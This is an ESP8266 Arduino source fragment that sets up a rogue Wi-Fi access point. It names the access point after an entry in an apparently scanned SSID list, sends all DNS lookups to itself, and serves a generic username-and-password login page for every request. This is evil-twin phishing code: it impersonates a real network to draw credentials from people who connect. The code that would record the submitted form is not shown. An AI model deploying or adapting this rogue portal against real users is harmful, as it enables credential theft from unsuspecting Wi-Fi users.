/*#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>*/

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String responseHTML = ""
  "<!DOCTYPE html><html><head><title>CaptivePortal</title></head><body>"
  "<section class='loginform cf'>"
  "<form name='login' action='index_submit' method='get' accept-charset='utf-8'>"
  "<ul>"
  "<li><label for='usermail'>Username </label>"
    "<input type='username' name='username'></li>"
    "<li><label for='password'>Password </label>"
    "<input type='password' name='password'></li>"
    "<li>"
    "<input type='submit' value='Login'></li>"
  "</ul>"
"</form>"
"</section>"
"</body></html>";

void captiveSetup() {

  //wifi_set_phy_mode(PHY_MODE_11B);
  ESP.eraseConfig();
  wifi_station_disconnect();

  //WiFi.mode(WIFI_AP);
  wifi_set_opmode(WIFI_AP);
  wifi_set_phy_mode(PHY_MODE_11G);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  String apstr = SSIDlist[numberOfInterrupts2+1].name;
  int str_len = apstr.length() + 1;
  char ap[str_len];
  apstr.toCharArray(ap, str_len);
  WiFi.softAP(ap);

  //WiFi.softAP("ESP-D1mini");

  delay(500);

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });
  webServer.begin();
}

void captiveLoop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
